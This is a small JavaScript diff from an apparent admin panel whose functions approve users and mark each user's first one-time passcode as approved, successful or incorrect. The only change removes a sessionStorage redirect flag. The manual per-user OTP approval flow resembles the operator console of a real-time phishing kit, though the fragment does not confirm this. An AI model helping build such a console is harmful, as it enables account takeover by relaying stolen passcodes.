@@ -940,7 +940,6 @@ async function apiCall(endpoint, method, email, successMsg, errorMsg) {
 function approveEmail(email) { apiCall('/api/admin/approve-user', 'POST', email, 'Email approved', 'Failed'); }
 function approveFirstOTP(email) { apiCall('/api/admin/approve-first-otp', 'POST', email, 'First OTP approved', 'Failed'); }
 function successFirstOTP(email) { 
-    sessionStorage.setItem('successRedirect', 'true');
     apiCall('/api/admin/success-first-otp', 'POST', email, 'Success! User redirected', 'Failed'); 
 }
 function incorrectFirstOTP(email) { apiCall('/api/admin/incorrect-first-otp', 'POST', email, 'First OTP incorrect', 'Failed'); }
